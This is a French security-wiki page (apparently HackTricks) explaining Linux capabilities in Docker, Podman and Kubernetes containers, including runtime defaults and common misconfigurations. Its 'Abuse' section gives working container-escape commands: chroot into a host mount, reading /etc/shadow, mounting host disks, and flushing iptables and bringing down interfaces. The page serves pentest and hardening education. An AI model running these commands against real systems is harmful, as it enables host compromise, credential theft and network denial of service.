# Linux Capabilities Dans Les Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Les capabilities Linux sont l'un des éléments les plus importants de la sécurité des containers, car elles répondent à une question subtile mais fondamentale : **que signifie réellement « root » à l'intérieur d'un container ?** Sur un système Linux normal, l'UID 0 impliquait historiquement un ensemble de privilèges très large. Dans les kernels modernes, ce privilège est décomposé en unités plus petites appelées capabilities. Un processus peut s'exécuter en tant que root tout en ne disposant pas de nombreuses opérations puissantes si les capabilities correspondantes ont été supprimées.

Les containers dépendent fortement de cette distinction. De nombreux workloads sont encore lancés avec l'UID 0 à l'intérieur du container pour des raisons de compatibilité ou de simplicité. Sans suppression des capabilities, cela serait beaucoup trop dangereux. Avec cette suppression, un processus root containerisé peut toujours effectuer de nombreuses tâches ordinaires à l'intérieur du container, tout en se voyant refuser des opérations plus sensibles du kernel. C'est pourquoi un shell de container qui affiche `uid=0(root)` ne signifie pas automatiquement « host root », ni même « privilèges étendus sur le kernel ». Les ensembles de capabilities déterminent la valeur réelle de cette identité root.

Pour consulter la référence complète des capabilities Linux ainsi que de nombreux exemples d'abus, voir :

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Fonctionnement

Les capabilities sont suivies dans plusieurs ensembles, notamment permitted, effective, inheritable, ambient et bounding. Pour de nombreuses évaluations de containers, la sémantique exacte de chaque ensemble au niveau du kernel est moins importante dans l'immédiat que la question pratique finale : **quelles opérations privilégiées ce processus peut-il effectuer avec succès maintenant, et quels gains de privilèges futurs sont encore possibles ?**

Cela est important, car de nombreuses techniques d'évasion sont en réalité des problèmes de capabilities déguisés en problèmes de containers. Un workload disposant de `CAP_SYS_ADMIN` peut accéder à une quantité énorme de fonctionnalités du kernel auxquelles un processus root normal dans un container ne devrait pas toucher. Un workload disposant de `CAP_NET_ADMIN` devient beaucoup plus dangereux s'il partage également le namespace réseau du host. Un workload disposant de `CAP_SYS_PTRACE` devient beaucoup plus intéressant s'il peut voir les processus du host via le partage du namespace PID du host. Dans Docker ou Podman, cela peut apparaître sous la forme de `--pid=host` ; dans Kubernetes, cela apparaît généralement sous la forme de `hostPID: true`.

Autrement dit, l'ensemble des capabilities ne peut pas être évalué isolément. Il doit être analysé conjointement avec les namespaces, seccomp et la politique MAC.

## Lab

Une manière très directe d'inspecter les capabilities à l'intérieur d'un container est la suivante :
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Vous pouvez également comparer un container plus restrictif à un autre auquel toutes les capabilities ont été ajoutées :
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Pour observer l’effet d’un ajout ciblé, essayez de tout supprimer, puis de ne réajouter qu’une seule capability :
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ces petites expériences montrent qu’un runtime ne se contente pas d’activer ou de désactiver un booléen appelé « privileged ». Il façonne la surface de privilèges réellement disponible pour le processus.

## High-Risk Capabilities

Bien que de nombreuses capabilities puissent être importantes selon la cible, quelques-unes reviennent régulièrement dans l’analyse des container escape.

**`CAP_SYS_ADMIN`** est celle que les defenders doivent traiter avec le plus de suspicion. Elle est souvent décrite comme « the new root », car elle débloque un nombre considérable de fonctionnalités, notamment les opérations liées aux mounts, les comportements sensibles aux namespaces et de nombreux chemins du kernel qui ne devraient jamais être exposés aux containers sans précaution. Si un container possède `CAP_SYS_ADMIN`, un seccomp faible et aucune confinement MAC fort, de nombreux chemins classiques de breakout deviennent beaucoup plus réalistes.

**`CAP_SYS_PTRACE`** est importante lorsque la visibilité des processus existe, en particulier si le PID namespace est partagé avec l’host ou avec des workloads voisins intéressants. Elle peut transformer la visibilité en possibilité de tampering.

**`CAP_NET_ADMIN`** et **`CAP_NET_RAW`** sont importantes dans les environnements axés sur le réseau. Sur un bridge network isolé, elles peuvent déjà être risquées ; dans un host network namespace partagé, elles sont bien plus dangereuses, car le workload peut être capable de reconfigurer le réseau de l’host, de sniffer, de spoof ou d’interférer avec les flux de trafic locaux.

**`CAP_SYS_MODULE`** est généralement catastrophique dans un environnement rootful, car le chargement de kernel modules revient effectivement à contrôler le host kernel. Elle ne devrait presque jamais apparaître dans un workload de container généraliste.

## Runtime Usage

Docker, Podman, les stacks basées sur containerd et CRI-O utilisent tous des contrôles de capabilities, mais leurs valeurs par défaut et leurs interfaces de gestion diffèrent. Docker les expose très directement via des flags tels que `--cap-drop` et `--cap-add`. Podman propose des contrôles similaires et bénéficie souvent de l’exécution rootless comme couche de sécurité supplémentaire. Kubernetes expose l’ajout et la suppression de capabilities via le `securityContext` du Pod ou du container. Les environnements de system containers tels que LXC/Incus s’appuient également sur le contrôle des capabilities, mais l’intégration plus large de ces systèmes avec l’host incite souvent les opérateurs à assouplir les valeurs par défaut plus agressivement que dans un environnement d’app containers.

Le même principe s’applique à tous : une capability qu’il est techniquement possible d’accorder n’est pas nécessairement une capability qui devrait l’être. De nombreux incidents réels commencent lorsqu’un opérateur ajoute une capability simplement parce qu’un workload échouait avec une configuration plus stricte et que l’équipe avait besoin d’un correctif rapide.

## Misconfigurations

L’erreur la plus évidente est **`--cap-add=ALL`** dans les CLIs de type Docker/Podman, mais ce n’est pas la seule. En pratique, un problème plus courant consiste à accorder une ou deux capabilities extrêmement puissantes, en particulier `CAP_SYS_ADMIN`, pour « faire fonctionner l’application », sans comprendre également les implications liées aux namespaces, à seccomp et aux mounts. Un autre mode d’échec courant consiste à combiner des capabilities supplémentaires avec le partage de host namespaces. Dans Docker ou Podman, cela peut apparaître sous la forme de `--pid=host`, `--network=host` ou `--userns=host` ; dans Kubernetes, l’exposition équivalente apparaît généralement via des paramètres du workload tels que `hostPID: true` ou `hostNetwork: true`. Chacune de ces combinaisons modifie ce que la capability peut effectivement affecter.

Il est également courant de voir des administrateurs penser que, parce qu’un workload n’est pas entièrement `--privileged`, il reste soumis à des restrictions significatives. C’est parfois vrai, mais il arrive aussi que la posture effective soit déjà suffisamment proche du mode privileged pour que la distinction cesse d’avoir une importance opérationnelle.

## Abuse

La première étape pratique consiste à énumérer l’ensemble effectif des capabilities et à tester immédiatement les actions spécifiques à ces capabilities qui seraient importantes pour un escape ou pour l’accès aux informations de l’host :
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` est présente, testez d'abord les abus basés sur le montage et l'accès au système de fichiers de l'hôte, car il s'agit de l'un des vecteurs de breakout les plus courants :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` est présente et que le conteneur peut voir des processus intéressants, vérifiez si cette capability peut être transformée en inspection de processus :
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` ou `CAP_NET_RAW` est présent, vérifiez si la charge de travail peut manipuler la pile réseau visible ou au moins recueillir des informations réseau utiles :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Lorsqu’un test de capability réussit, combinez ce résultat avec la situation des namespaces. Une capability qui semble seulement risquée dans un namespace isolé peut immédiatement devenir une primitive d’escape ou de reconnaissance de l’hôte lorsque le container partage également le PID de l’hôte, le réseau de l’hôte ou les mounts de l’hôte.

### Exemple complet : `CAP_SYS_ADMIN` + mount de l’hôte = Host Escape

Si le container dispose de `CAP_SYS_ADMIN` et d’un bind mount inscriptible du filesystem de l’hôte, tel que `/host`, le chemin d’escape est souvent simple :
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` réussit, les commandes s’exécutent désormais dans le contexte du système de fichiers racine de l’hôte :
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` n’est pas disponible, le même résultat peut souvent être obtenu en appelant le binaire via l’arborescence montée :
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Exemple complet : `CAP_SYS_ADMIN` + accès aux périphériques

Si un périphérique bloc de l’hôte est exposé, `CAP_SYS_ADMIN` peut permettre un accès direct au système de fichiers de l’hôte :
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Exemple complet : `CAP_NET_ADMIN` + Host Networking

Cette combinaison ne permet pas toujours d’obtenir directement les privilèges root sur l’hôte, mais elle peut reconfigurer entièrement la pile réseau de l’hôte :
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Cela peut permettre un déni de service, l’interception du trafic ou l’accès à des services qui étaient auparavant filtrés.

## Vérifications

L’objectif des vérifications des capabilities n’est pas seulement d’extraire des valeurs brutes, mais de comprendre si le processus dispose de privilèges suffisants pour rendre dangereuse sa situation actuelle au niveau des namespaces et des mounts.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Ce qui est intéressant ici :

- `capsh --print` est le moyen le plus simple d'identifier les capabilities à haut risque telles que `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
- La ligne `CapEff` dans `/proc/self/status` indique ce qui est effectivement actif actuellement, et pas seulement ce qui pourrait être disponible dans d'autres ensembles.
- Un dump des capabilities devient beaucoup plus important si le container partage également les namespaces PID, réseau ou utilisateur de l'host, ou s'il dispose de mounts de l'host accessibles en écriture.

Après avoir collecté les informations brutes sur les capabilities, l'étape suivante consiste à les interpréter. Déterminez si le processus est root, si les user namespaces sont actifs, si des namespaces de l'host sont partagés, si seccomp est en mode enforcing, et si AppArmor ou SELinux restreignent encore le processus. Un ensemble de capabilities ne représente qu'une partie du problème, mais c'est souvent cette partie qui explique pourquoi un container breakout fonctionne alors qu'un autre échoue avec le même point de départ apparent.

## Runtime Defaults

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Ensemble de capabilities réduit par défaut | Docker conserve une allowlist par défaut de capabilities et supprime les autres | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Ensemble de capabilities réduit par défaut | Les containers Podman sont unprivileged par défaut et utilisent un modèle de capabilities réduit | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hérite des valeurs par défaut du runtime, sauf modification | Si aucune `securityContext.capabilities` n'est spécifiée, le container reçoit l'ensemble de capabilities par défaut du runtime | `securityContext.capabilities.add`, ne pas effectuer `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Généralement les valeurs par défaut du runtime | L'ensemble effectif dépend du runtime et du Pod spec | identique à la ligne Kubernetes ; la configuration OCI/CRI directe peut également ajouter explicitement des capabilities |

Pour Kubernetes, le point important est que l'API ne définit pas un ensemble universel de capabilities par défaut. Si le Pod n'ajoute ni ne supprime de capabilities, le workload hérite des valeurs par défaut du runtime pour ce node.

{{#include ../../../../banners/hacktricks-training.md}}
